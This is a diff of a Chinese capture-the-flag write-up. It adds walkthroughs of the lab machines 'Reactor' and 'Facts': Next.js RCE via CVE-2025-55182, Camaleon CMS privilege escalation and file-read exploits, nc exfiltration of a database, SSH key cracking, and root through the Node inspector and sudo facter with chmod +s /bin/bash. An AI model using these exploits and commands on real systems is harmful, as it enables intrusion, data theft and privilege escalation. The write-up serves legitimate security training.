@@ -57,9 +57,9 @@ answer：yes
 
 ## Task 4/5
 
-What is the ID of the PCAP file that contains sensative data?
+Task 4 Q：What is the ID of the PCAP file that contains sensative data?
 
-Which application layer protocol in the pcap file can the sensetive data be found in?
+Task 5 Q：Which application layer protocol in the pcap file can the sensetive data be found in?
 
 使用burp，在上一步骤手工测试了1-3是存在的，但是实际上使用burp爆破发现还有个0
 
@@ -190,7 +190,7 @@ Nathan answer：f3e11475bd7f5f631ab75ec33b38f431
 
 Root answer：640bbd78aa4c1f8e97c799598d3f3205
 
-# 靶场：Connected
+# 靶场：Connected(Linux)
 
 没有问题，只有两个flag
 
@@ -231,7 +231,7 @@ Nmap done: 1 IP address (1 host up) scanned in 166.58 seconds
 
 ```
 
-这次打开后被重定向到了`http://connected.htb/admin/config.php`，站点标题为FreePbx，Google了以下发现存在过多个严重的远程代码执行（RCE）漏洞，下载一个官方poc：`https://github.com/watchtowrlabs/watchTowr-vs-FreePBX-CVE-2025-57819`
+这次打开后被重定向到了`http://connected.htb/admin/config.php`，站点标题为FreePbx，Google发现存在过多个严重的远程代码执行（RCE）漏洞，下载一个官方poc：`https://github.com/watchtowrlabs/watchTowr-vs-FreePBX-CVE-2025-57819`
 
 ```
 python3 watchTowr-vs-FreePBX-CVE-2025-57819.py -H https://connected.htb
@@ -513,3 +513,514 @@ ff74454b79a21ed713c0f2f1277b8e8f
 Asterisk answer：a5a948b611b9fe60702a57c6d423dc75
 
 Root answer：ff74454b79a21ed713c0f2f1277b8e8f
+
+# 靶场：Reactor(Linux)
+
+先nmap扫一下，发现开了22和3000
+
+```
+PORT     STATE SERVICE   VERSION
+22/tcp   open  ssh       OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 ce:fd:0d:82:c0:23:ed:6e:4b:ea:13:fa:4f:ea:ef:b7 (ECDSA)
+|_  256 f8:44:c6:46:58:7a:39:21:ef:16:44:e9:58:c2:f3:62 (ED25519)
+3000/tcp open  ppp?
+| fingerprint-strings: 
+|   GetRequest: 
+|     HTTP/1.1 200 OK
+|     Vary: RSC, Next-Router-State-Tree, Next-Router-Prefetch, Next-Router-Segment-Prefetch, Accept-Encoding
+|     x-nextjs-cache: HIT
+|     x-nextjs-prerender: 1
+|     x-nextjs-stale-time: 4294967294
+|     X-Powered-By: Next.js
+|     Cache-Control: s-maxage=31536000, 
+|     ETag: "p02u6gnhufd8t"
+|     Content-Type: text/html; charset=utf-8
+|     Content-Length: 17175
+|     Date: Sat, 20 Jun 2026 04:08:49 GMT
+|     Connection: close
+
+```
+
+直接访问发现没什么可利用的信息
+
+但是扫描发现是Next.js，而Next.js基于react
+
+```
+x-nextjs-cache:HIT
+x-nextjs-prerender:1
+x-nextjs-stale-time:4294967294
+X-Powered-By:Next.js
+
+```
+
+使用nuclei扫一下是否该站点是否使用了存在漏洞的react包或者Next.js版本（无效操作）
+
+```
+┌──(kali㉿kali)-[~/Desktop]
+└─$ nuclei -u http://10.129.7.70:3000 -tags nextjs
+
+
+                     __     _
+   ____  __  _______/ /__  (_)
+  / __ \/ / / / ___/ / _ \/ /
+ / / / / /_/ / /__/ /  __/ /
+/_/ /_/\__,_/\___/_/\___/_/   v3.8.0
+
+                projectdiscovery.io
+
+[INF] nuclei-templates are not installed, installing...
+[INF] Successfully installed nuclei-templates at /home/kali/.local/nuclei-templates
+[WRN] Found 1 templates with runtime error (use -validate flag for further examination)
+[INF] Current nuclei version: v3.8.0 (outdated)
+[INF] Current nuclei-templates version: v10.4.4 (latest)
+[INF] New templates added in latest release: 179
+[INF] Templates loaded for current scan: 14
+[INF] Executing 14 signed templates from projectdiscovery/nuclei-templates
+[INF] Targets loaded for current scan: 1
+[INF] Using Interactsh Server: oast.online
+[INF] Scan completed in 7.084321635s. 0 matches found.
+
+```
+
+没扫到，手动搜索一下react爆出过的漏洞，发现CVE-2025-55182 RCE漏洞，poc下载地址：`https://github.com/ThemeHackers/CVE-2025-55182`
+
+克隆仓库到本地使用，需要安装一下python依赖，这里创建python虚拟环境使用
+
+```
+┌──(kali㉿kali)-[~/Desktop/CVE-2025-55182]
+└─$ python3 -m venv venv
+
+                                                                                                     
+┌──(kali㉿kali)-[~/Desktop/CVE-2025-55182]
+└─$ source venv/bin/activate
+
+                                                                                                     
+┌──(venv)─(kali㉿kali)-[~/Desktop/CVE-2025-55182]
+└─$ pip install -r requirements.txt
+
+```
+
+接下来就可以正常使用了，检测漏洞是否存在
+
+```
+┌──(venv)─(kali㉿kali)-[~/Desktop/CVE-2025-55182]
+└─$ python CVE-2025-55182.py -u http://10.129.7.70:3000
+React2Shell Scanner - CVE-2025-55182/CVE-2025-66478
+[*] Loaded 1 host(s) to scan
+[*] Using 10 thread(s)
+[*] Timeout: 10s
+[*] Using RCE PoC check
+[!] SSL verification disabled
+
+[DEBUG] Elapsed: 0.45s (Variant: None)
+[VULNERABLE] http://10.129.7.70:3000 - RCE Confirmed!
+
+=== HTTP Response ===
+**Status: 303**
+Vary: RSC, Next-Router-State-Tree, Next-Router-Prefetch, Next-Router-Segment-Prefetch, 
+Accept-Encoding
+cache-control: private, no-cache, no-store, max-age=0, must-revalidate
+x-action-revalidated: [[],0,0]
+**x-action-redirect: /login?a=MTExMTEK;push**
+content-type: text/x-component
+date: Sat, 20 Jun 2026 03:26:29 GMT
+x-nextjs-cache: HIT
+x-nextjs-prerender: 1
+X-Powered-By: Next.js
+Content-Encoding: gzip
+Connection: keep-alive
+Keep-Alive: timeout=5
+Transfer-Encoding: chunked
+
+[VULNERABLE] http://10.129.7.70:3000 - Status: 303
+
+```
+
+根据放出的部分响应信息，确认漏洞存在，先退出python虚拟环境
+
+```
+┌──(venv)─(kali㉿kali)-[~/Desktop/CVE-2025-55182]
+└─$ deactivate
+
+```
+
+获取shell，并发现数据库文件
+
+```
+┌──(kali㉿kali)-[~/Desktop/CVE-2025-55182]
+└─$ python CVE-2025-55182.py -u http://10.129.7.70:3000 --exploit
+
+React2Shell Scanner - CVE-2025-55182/CVE-2025-66478
+[*] Starting interactive shell on http://10.129.7.70:3000
+[*] Type 'exit' or 'quit' to stop
+Shell> ls
+app
+next.config.js
+node_modules
+package.json
+package-lock.json
+reactor.db
+
+```
+
+使用nc传输文件，攻击机下载数据库文件并查看
+
+对目标机的操作：
+
+```
+Shell> nc 10.10.16.230 4444 < reactor.db
+1367733479
+
+```
+
+对攻击机的操作：
+
+```
+┌──(kali㉿kali)-[~/Desktop]
+└─$ nc -lvnp 4444 > received_reactor.db
+
+```
+
+数据库user表中存放的信息如下
+
+```
+admin	a203b22191d744a4e70ada5c101b17b8	administrator	admin@reactor.htb
+engineer	39d97110eafe2a9a68639812cd271e8e	operator	engineer@reactor.htb
+
+// 进行md5解密，admin的是付费记录，engineer的密码为：reactor1
+
+```
+
+ssh进行连接，拿到engineer的flag
+
+```
+┌──(kali㉿kali)-[~/Desktop]
+└─$ ssh engineer@10.129.7.70
+
+engineer@reactor:~$ ls                                                   
+user.txt                                                                 
+engineer@reactor:~$ cat user.txt 
+23279ecbfeceb8c58416da69e6ca9f65
+
+```
+
+接下来依旧是提权环节，Next.js 应用本质上是一个 **Node.js 应用**，查看后台进程搜索出包含node关键词的行，也可以使用linpeas进行扫描，这里省点时间就直接搜索关键词了，不过结果都是一样的
+
+```
+engineer@reactor:~$ ps aux | grep node
+node        1418  3.7  3.0 11828308 121144 ?     Ssl  02:10   3:33 next-server (v15.0.3)
+root        1420  0.0  1.1 1066424 46912 ?       Ssl  02:10   0:00 /usr/bin/node --inspect=127.0.0.1:9229 /opt/uptime-monitor/worker.js
+node        1739  0.0  0.5  29228 20124 ?        S    03:34   0:00 python3 -m http.server 8000
+engineer    1824  0.0  0.0   6544  2280 pts/0    S+   03:45   0:00 grep --color=auto node
+
+```
+
+发现了一个以`root`身份运行，并开启了**Node.js调试模式**（`--inspect`）的脚本
+
+**了解**：
+
+当 Node.js 进程以 `--inspect` 模式启动时，它会启动一个**调试服务器**，并默认在 `http://127.0.0.1:9229` 提供一个 **HTTP API**
+
+其中，最重要的端点就是这个 **`/json`** 接口：
+
+|       端点        |                                作用                                |
+| :-------------: | :--------------------------------------------------------------: |
+|  `/json/list`   |          返回所有可调试目标（脚本）的列表（与 `/json` 功能相同，建议使用 `/json`）           |
+| `/json/version` |                     返回 Node.js 版本和调试器协议版本信息                      |
+|     `/json`     | 等同于 `/json/list`，返回所有可调试目标的详细信息，包括每个脚本的 ID、标题、类型和 WebSocket 调试地址 |
+
+**验证调试接口是否可访问**，发现websocket地址，但无法连接，利用ws连接调试端口可以看这位师傅的文章：[https://blog.csdn.net/weixin_44368093/article/details/161388843]()
+
+```
+engineer@reactor:~$ curl http://127.0.0.1:9229/json
+[ {
+  "description": "node.js instance",
+  "devtoolsFrontendUrl": "devtools://devtools/bundled/js_app.html?experiments=true&v8only=true&ws=127.0.0.1:9229/02622acc-24b0-4a39-aaaa-a48bf36a5bcf",
+  "devtoolsFrontendUrlCompat": "devtools://devtools/bundled/inspector.html?experiments=true&v8only=true&ws=127.0.0.1:9229/02622acc-24b0-4a39-aaaa-a48bf36a5bcf",
+  "faviconUrl": "https://nodejs.org/static/images/favicons/favicon.ico",
+  "id": "02622acc-24b0-4a39-aaaa-a48bf36a5bcf",
+  "title": "/opt/uptime-monitor/worker.js",
+  "type": "node",
+  "url": "file:///opt/uptime-monitor/worker.js",
+  "webSocketDebuggerUrl": "ws://127.0.0.1:9229/02622acc-24b0-4a39-aaaa-a48bf36a5bcf"
+} ]
+
+```
+
+考虑在无需任何网络转发的情况下，**直接在目标机上启动 Node.js 调试客户端**
+
+```
+engineer@reactor:~$ node inspect 127.0.0.1:9229
+connecting to 127.0.0.1:9229 ... ok
+
+```
+
+设置SUID权限位，提权成功并拿到flag
+
+**解释**：
+
+|              部分              |                   含义                   |
+| :--------------------------: | :------------------------------------: |
+| `process.mainModule.require` |  Node.js中加载模块的另一种写法，等同于 `require()`。   |
+|     `('child_process')`      | 加载Node.js的 **子进程模块**，这个模块提供了执行系统命令的能力。 |
+|        `.execSync()`         | **同步执行**一个系统命令，并返回结果。它会阻塞程序，直到命令执行完毕。  |
+|   `('chmod +s /bin/bash')`   |         在目标系统上执行的 **Shell命令**。         |
+
+```
+debug> repl
+Press Ctrl+C to leave debug repl
+> process.mainModule.require('child_process').execSync('chmod +s /bin/bash')
+Uint8Array(0)
+> .exit
+engineer@reactor:~$ /bin/bash -p
+bash-5.2# cat /root/root.txt
+82bdc985955a80a1d26b67d2ceca9150
+
+```
+
+Engineer answer：23279ecbfeceb8c58416da69e6ca9f65
+
+Root answer：82bdc985955a80a1d26b67d2ceca9150
+
+# 靶场：Facts(Linux)
+
+nmap扫描
+
+```
+┌──(kali㉿kali)-[~/Desktop]
+└─$ nmap -sC -sV 10.129.7.169 
+Starting Nmap 7.98 ( https://nmap.org ) at 2026-06-20 06:16 -0400
+Nmap scan report for 10.129.7.169
+Host is up (0.21s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 9.9p1 Ubuntu 3ubuntu3.2 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 4d:d7:b2:8c:d4:df:57:9c:a4:2f:df:c6:e3:01:29:89 (ECDSA)
+|_  256 a3:ad:6b:2f:4a:bf:6f:48:ac:81:b9:45:3f:de:fb:87 (ED25519)
+80/tcp open  http    nginx 1.26.3 (Ubuntu)
+|_http-title: Did not follow redirect to http://facts.htb/
+|_http-server-header: nginx/1.26.3 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+```
+
+无法直接访问，本地DNS覆盖
+
+```
+┌──(kali㉿kali)-[~/Desktop]
+└─$ sudo echo '10.129.7.169 facts.htb' | sudo tee -a /etc/hosts
+[sudo] password for kali: 
+10.129.7.169 facts.htb
+
+```
+
+正常访问，没什么可利用的信息，发现有评论区，那说明肯定有登录，扫一下目录
+
+```
+┌──(kali㉿kali)-[~/Desktop]
+└─$ ffuf -u http://facts.htb/FUZZ -w /usr/share/wordlists/dirb/small.txt
+
+// 发现admin有重定向
+admin                   [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 1473ms]
+
+```
+
+发现登录页面存在注册功能，随便注册一个账号，进入后台只有一个控制面板，页尾部分标明为**Camaleon CMS**版本为**2.9.0**
+
+查一下Camaleon CMS相关漏洞，CVE-2025-2304 - Camaleon CMS Privilege Escalation，POC：https://github.com/predyy/CVE-2025-2304
+
+```
+┌──(kali㉿kali)-[~/Desktop/CVE-2025-2304]
+└─$ python3 exp.py http://facts.htb bza 111111
+[*] Logging in as bza ...
+[+] Login successful
+[+] Got profile page
+[i] Version detected: 2.9.0 (< 2.9.1) - appears to be vulnerable version
+[+] authenticity_token: 4u_tPCFoTxCP-Z5vBu6woqSa0dK_seNZQn2-x0d_qBhKf8QMM1kQq9l6K8fY3qtyGH1CTohStxrpwHLKzGQqqg
+http://facts.htb/admin/users/6/updated_ajax
+[*] Submitting password change request
+[+] Submit successful, you should be admin
+
+```
+
+再次登录发现，权限已经变成Administrator，页面也不同了，找寻有价值信息
+
+发现存在一个配置，是Amazon的s3存储桶，内容如下：
+
+|           标题           |                    信息                    |
+| :--------------------: | :--------------------------------------: |
+| Aws s3 access key (*)  |           AKIACB2F36C4E23F13AD           |
+| Aws s3 secret key (*)  | zAnDp7t/ItkB4gP+t7v7R8RGMfdr0SC7wjtJYL8Y |
+| Aws s3 bucket name (*) |               randomfacts                |
+|     Aws s3 区域 (*)      |                us-east-1                 |
+| Aws s3 bucket endpoint |          http://localhost:54321          |
+|     Cloudfront url     |       http://facts.htb/randomfacts       |
+
+配置并查看发现有两个桶，查看有无敏感信息，发现存在`authorized_keys`文件，它包含**允许登录的用户公钥列表**，下载发现文件中没有存在用户名，同时还需要下载ssh密钥文件
+
+```
+┌──(kali㉿kali)-[~/Desktop]
+└─$ aws configure --profile htb
+AWS Access Key ID [None]: AKIACB2F36C4E23F13AD
+AWS Secret Access Key [None]: zAnDp7t/ItkB4gP+t7v7R8RGMfdr0SC7wjtJYL8Y
+Default region name [None]: randomfacts
+Default output format [None]: json
+
+┌──(kali㉿kali)-[~/Desktop]
+└─$ aws s3 ls --profile htb  --endpoint-url http://10.129.7.169:54321
+2025-09-11 08:06:52 internal
+2025-09-11 08:06:52 randomfacts
+
+┌──(kali㉿kali)-[~/Desktop]
+└─$ aws s3 ls s3://internal/.ssh/ --profile htb --endpoint-url http://10.129.7.169:54321
+2026-06-20 06:14:08         82 authorized_keys
+2026-06-20 06:14:08        464 id_ed25519
+
+┌──(kali㉿kali)-[~/Desktop]
+└─$ cat authorized_keys 
+ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDBg000olel66WJqmJTBC6iDit7cmjjcXJMjZUNsC9fE  
+
+┌──(kali㉿kali)-[~/Desktop]
+└─$ cat id_ed25519 
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABDXbFiKqc
+cb8m8xww8YwvmfAAAAGAAAAAEAAAAzAAAAC3NzaC1lZDI1NTE5AAAAIDBg000olel66WJq
+mJTBC6iDit7cmjjcXJMjZUNsC9fEAAAAoAiu1GJxjSZHNYGzUNyHybvrvKu3CB6vHtDcTh
+0awpLK9SIjtF9ZorNQIY2kk0rRem4OHh9qtpu3tAn1GGRVYRw735vbBPMsAS27IJMLjgNT
++EWs4X5D/sr2G2gpPVeU84hPkwYxPMJOzNor1SQNPafOad288GSuyjUA4/e6F/TL7SNRT5
+dqROPzym12Uv+8oPteKHR/US7mOVesHpSJsFA=
+-----END OPENSSH PRIVATE KEY-----
+
+```
+
+现在的情况是有SSH私钥，但是不知道是谁的，查看了网站的一些用户名但是都没用，到现在就没思路了
+
+对该套模板继续搜索，发现还有一个CVE-2024-46987 - Camaleon CMS Authenticated Arbitrary File Read，POC：`https://github.com/Goultarde/CVE-2024-46987`，这是任意文件读取的漏洞，发现关键用户的信息`trivia:x:1000:1000:facts.htb:/home/trivia:/bin/bash`
+
+```
+┌──(kali㉿kali)-[~/Desktop/CVE-2024-46987]
+└─$ python3 CVE-2024-46987.py -u http://facts.htb --user bza -p 111111 /etc/passwd | tail
+syslog:x:104:104::/nonexistent:/usr/sbin/nologin
+uuidd:x:105:105::/run/uuidd:/usr/sbin/nologin
+tcpdump:x:106:107::/nonexistent:/usr/sbin/nologin
+tss:x:107:108:TPM software stack,,,:/var/lib/tpm:/bin/false
+landscape:x:108:109::/var/lib/landscape:/usr/sbin/nologin
+fwupd-refresh:x:989:989:Firmware update daemon:/var/lib/fwupd:/usr/sbin/nologin
+sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
+trivia:x:1000:1000:facts.htb:/home/trivia:/bin/bash
+william:x:1001:1001::/home/william:/bin/bash
+_laurel:x:101:988::/var/log/laurel:/bin/false
+
+```
+
+再尝试能不能读取到flag，flag是在william这个用户中，除此之外没有其他信息了，现在又回到了该如何利用密钥
+
+```
+┌──(kali㉿kali)-[~/Desktop/CVE-2024-46987]
+└─$ python3 CVE-2024-46987.py -u http://facts.htb --user bza -p 111111 /home/william/user.txt
+b250c8e5b958147ba7dbb4eba2dff15a
+
+```
+
+可以使用John the Ripper，但是手里的这个`id_ed25519`文件本身是有密码保护（加密过的），John the Ripper不能直接处理 SSH 私钥文件，需要先用`ssh2john` 这个工具把它转换成 John 能识别的哈希格式
+
+先转换为hash文件
+
+```
+┌──(kali㉿kali)-[~/Desktop]
+└─$ ssh2john id_ed25519 > id_ed25519.hash
+
+```
+
+使用John和字典进行破解
+
+```
+┌──(kali㉿kali)-[~/Desktop]
+└─$ john --wordlist=/usr/share/wordlists/rockyou.txt id_ed25519.hash
+
+// 等待是漫长的
+
+```
+
+最后查看破解出的口令
+
+```
+┌──(kali㉿kali)-[~/Desktop]
+└─$ john --show id_ed25519.hash                                     
+id_ed25519:dragonballz
+  
+```
+
+因为**SSH客户端**在连接时，会**强制检查私钥文件的权限**，所以需要修改权限，只有**所有者**能读写
+
+```
+┌──(kali㉿kali)-[~/Desktop]
+└─$ chmod 600 id_ed25519
+
+```
+
+```
+┌──(kali㉿kali)-[~/Desktop]
+└─$ ssh -i id_ed25519 trivia@facts.htb
+Enter passphrase for key 'id_ed25519': 
+
+```
+
+`sudo -l`列出当前用户被允许执行的命令发现，`facter`命令以 root 权限执行，而且不需要密码，查看facter中的内容
+
+```
+trivia@facts:/home$ sudo -l
+Matching Defaults entries for trivia on facts:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User trivia may run the following commands on facts:
+    (ALL) NOPASSWD: /usr/bin/facter
+
+trivia@facts:/home$ cat /usr/bin/facter
+#!/usr/bin/ruby
+# frozen_string_literal: true
+
+require 'pathname'
+require 'facter/framework/cli/cli_launcher'
+
+Facter::OptionsValidator.validate(ARGV)
+processed_arguments = CliLauncher.prepare_arguments(ARGV)
+
+CliLauncher.start(processed_arguments)
+
+```
+
+facter目录中的第一个`.rb`文件`/path/to/dir/`将被执行
+
+所以可以创建一个恶意脚本，并执行
+
+```
+trivia@facts:~$ cat > /tmp/exploit/exploit.rb << 'EOF'
+> #!/usr/bin/env ruby
+> puts "ruby file"
+> system("chmod +s /bin/bash")
+> EOF
+
+// `--custom-dir=/tmp/` → 指定 facter 加载 `/tmp/` 目录下的自定义 fact（`.rb` 文件）
+// `x` → 一个不存在的 fact 名称，触发 facter 加载所有自定义 fact
+trivia@facts:~$ sudo /usr/bin/facter --custom-dir=/tmp/exploit/ x
+ruby file
+
+```
+
+检查是否设置成功SUID位，如果成功，直接提权并拿到root的flag
+
+```
+trivia@facts:~$ ls -l /bin/bash
+-rwsr-sr-x 1 root root 1740896 Mar  5  2025 /bin/bash
+trivia@facts:~$ /bin/bash -p
+bash-5.2# cat /root/root.txt
+fd3ea3d16577bdbc128f85e500f204b4
+
+```
+
+William answer：b250c8e5b958147ba7dbb4eba2dff15a
+
+Root answer：fd3ea3d16577bdbc128f85e500f204b4
